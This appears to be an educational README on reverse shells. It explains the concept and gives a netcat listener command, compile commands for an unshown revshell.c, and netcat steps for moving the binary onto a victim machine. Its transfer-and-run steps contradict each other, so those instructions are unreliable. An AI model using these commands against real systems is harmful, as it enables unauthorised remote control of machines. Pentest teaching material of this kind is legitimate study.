## What is Reverse Shell??

Reverse shell or often called connect-back shell is remote shell introduced from the target by connecting back to the attacker machine and spawning target shell on the attacker machine. This usually used during exploitation process to gain control of the remote machine.

The reverse shell can take the advantage of common outbound ports such as port `80, 443, 8080` and etc.

The reverse shell usually used when the target victim machine is blocking incoming connection from certain port by firewall. To bypass this firewall restriction, red teamers and pentesters use reverse shells.

This exposes the control server of the attacker and traces might pickup by network security monitoring services of target network.

### **There are three steps to get a reverse shell.**  
---
-  An attacker exploit a vulnerability on a target system or network with the ability to perform a code execution.  
- Then attacker setup listener on his own machine.  
- Then attacker injecting reverse shell on vulnerable system to exploit the vulnerability.

***In real cyber attacks, the reverse shell can also be obtained through social engineering, for example, a piece of malware installed on a local workstation via a phishing email or a malicious website might initiate an outgoing connection to a command server and provide hackers with a reverse shell capability.***

# Listener

For simplicity, in this example, the victim allow outgoing connection on any port (default iptables firewall rule). In our case we use `4444` as a listener port. You can change it to your preferable port you like. Listener could be any program/utility that can open TCP/UDP connections or sockets. In most cases I like to use `nc` or `netcat` utility.

Example: `nc -l -v -p 4444`

In this case `-l` to listen, `-v` for verbose and `-p` for port 4444 on every interface. You can add -n for numeric only IP addresses, but not DNS.

For Reverse Shell Cheat Sheet [Click Here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### **Lets Jump into our code....**

To compile: `gcc revshell.c -o revshell -w`

For 32-bit linux: `gcc revshell.c -o revshell -m32 -w`

Lets go to transfer some file to victim's machine. File transfer is considered to be one of the most important steps involved in post exploitation.

On victim machine: `nc -lvp 4444 > revshell`

On attacker machine: `nc <your_ip> 4444 -w 3 < revshell`

On the attacker machine make the `revshell` as executable using `chmod +x revshell` and run the binary by `./revshell`.

# Mitigation 


There is no way to completely block reverse shells. Unless you carefully using reverse shells for remote administration any reverse shells connections are likely to be malicious... Hope this may help you.  Thanks for your time.

Happy Learning ✨✨ Have a great day.